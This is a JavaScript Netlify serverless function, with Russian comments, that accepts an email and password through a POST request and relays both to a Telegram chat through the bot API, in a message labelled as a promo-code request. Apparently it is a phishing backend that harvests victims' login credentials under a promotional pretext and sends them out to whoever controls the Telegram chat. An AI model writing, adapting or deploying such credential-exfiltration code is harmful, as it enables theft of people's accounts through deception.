exports.handler = async (event, context) => {
  // Разрешаем CORS (чтобы браузер пустил запрос с фронтенда)
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  let body;
  try {
    body = JSON.parse(event.body);
  } catch (e) {
    return {
      statusCode: 400,
      headers,
      body: JSON.stringify({ error: 'Invalid JSON' })
    };
  }

  const { email, password } = body;

  // Токены берем ТОЛЬКО из переменных окружения Netlify
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.error('Missing environment variables');
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Server not configured' })
    };
  }

  const message = `🔥 *Заявка на промокод!*\n\n📧 Email: ${email}\n${password ? `🔑 Пароль: ${password}` : ''}\n\n*Проверь и подтверди!*`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();

    if (data.ok) {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true })
      };
    } else {
      console.error('Telegram error:', data);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: data.description || 'Telegram API error' })
      };
    }
  } catch (error) {
    console.error('Fetch error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Network error' })
    };
  }
};
